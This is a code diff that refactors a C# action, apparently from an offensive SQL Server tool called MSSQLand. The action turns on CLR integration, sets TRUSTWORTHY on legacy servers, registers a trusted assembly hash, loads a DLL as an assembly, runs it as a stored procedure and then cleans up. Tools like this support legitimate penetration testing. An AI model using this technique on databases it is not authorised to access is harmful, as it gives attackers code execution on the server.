@@ -4,7 +4,6 @@ using System.Net;
 using System.Security.Cryptography;
 using MSSQLand.Utilities;
 using MSSQLand.Services;
-using MSSQLand.Models;
 
 namespace MSSQLand.Actions.Execution
 {
@@ -40,7 +39,7 @@ namespace MSSQLand.Actions.Execution
             }
         }
 
-        public override void Execute(DatabaseContext databaseContext)
+        public override object? Execute(DatabaseContext databaseContext)
         {
             // Step 1: Get the SHA-512 hash for the DLL and its bytes.
             string[] library = ConvertDLLToSQLBytes(_dllURI);
@@ -48,12 +47,12 @@ namespace MSSQLand.Actions.Execution
             if (library.Length != 2 || string.IsNullOrEmpty(library[0]) || string.IsNullOrEmpty(library[1]))
             {
                 Logger.Error("Failed to convert DLL to SQL-compatible bytes.");
-                return;
+                return false;
             }
 
-            if (databaseContext.ConfigService.SetConfigurationOption("clr enabled", 1) == false)
+            if (!databaseContext.ConfigService.SetConfigurationOption("clr enabled", 1))
             {
-                return;
+                return false;
             }
 
             string libraryHash = library[0];
@@ -70,26 +69,23 @@ namespace MSSQLand.Actions.Execution
             string dropClrHash = $"EXEC sp_drop_trusted_assembly 0x{libraryHash};";
 
             Logger.Task("Starting CLR assembly deployment process");
+
             try
             {
-
                 if (databaseContext.Server.Legacy)
                 {
                     Logger.Info("Legacy server detected. Enabling TRUSTWORTHY property");
                     databaseContext.QueryService.ExecuteNonProcessing($"ALTER DATABASE {databaseContext.Server.Database} SET TRUSTWORTHY ON;");
                 }
-                else
+
+                if (!databaseContext.ConfigService.RegisterTrustedAssembly(libraryHash, libraryPath))
                 {
-                    if (databaseContext.ConfigService.RegisterTrustedAssembly(libraryHash, libraryPath) == false)
-                    {
-                        return;
-                    }
+                    return false;
                 }
 
-                // Step 1: Drop existing procedure and assembly if they exist
+                // Drop existing procedure and assembly if they exist
                 databaseContext.QueryService.ExecuteNonProcessing(dropProcedure);
                 databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
-
 
                 // Step 3: Create the assembly from the DLL bytes
                 Logger.Task("Creating the assembly from DLL bytes");
@@ -99,9 +95,7 @@ namespace MSSQLand.Actions.Execution
                 if (!databaseContext.ConfigService.CheckAssembly(assemblyName))
                 {
                     Logger.Error("Failed to create a new assembly");
-                    databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
-                    databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);
-                    return;
+                    return false;
                 }
 
                 Logger.Success($"Assembly '{assemblyName}' successfully created");
@@ -114,10 +108,7 @@ namespace MSSQLand.Actions.Execution
                 if (!databaseContext.ConfigService.CheckProcedures(_function))
                 {
                     Logger.Error("Failed to create the stored procedure");
-                    databaseContext.QueryService.ExecuteNonProcessing(dropProcedure);
-                    databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
-                    databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);
-                    return;
+                    return false;
                 }
 
                 Logger.Success($"Stored procedure '{_function}' successfully created");
@@ -127,32 +118,24 @@ namespace MSSQLand.Actions.Execution
                 databaseContext.QueryService.ExecuteNonProcessing($"EXEC {_function};");
                 Logger.Success("Stored procedure executed successfully");
 
-                // Step 6: Cleanup - Drop procedure, assembly, and trusted hash
+                return true;
+            }
+            catch (Exception ex)
+            {
+                Logger.Error($"Error during CLR assembly deployment: {ex.Message}");
+                return false;
+            }
+            finally
+            {
+                // Cleanup (always executed)
                 Logger.Task("Performing cleanup");
                 databaseContext.QueryService.ExecuteNonProcessing(dropProcedure);
                 databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
                 databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);
 
-                // Step 7: Reset TRUSTWORTHY property for legacy servers
                 if (databaseContext.Server.Legacy)
                 {
                     Logger.Info("Resetting TRUSTWORTHY property");
-                    databaseContext.QueryService.ExecuteNonProcessing(
-                        $"ALTER DATABASE {databaseContext.Server.Database} SET TRUSTWORTHY OFF;");
-                }
-
-                Logger.Success("Cleanup completed");
-            }
-            catch (Exception ex)
-            {
-                Logger.Error($"Error during CLR assembly deployment: {ex.Message}");
-                // Perform cleanup in case of failure
-                databaseContext.QueryService.ExecuteNonProcessing(dropProcedure);
-                databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
-                databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);
-
-                if (databaseContext.Server.Legacy)
-                {
                     databaseContext.QueryService.ExecuteNonProcessing(
                         $"ALTER DATABASE {databaseContext.Server.Database} SET TRUSTWORTHY OFF;");
                 }
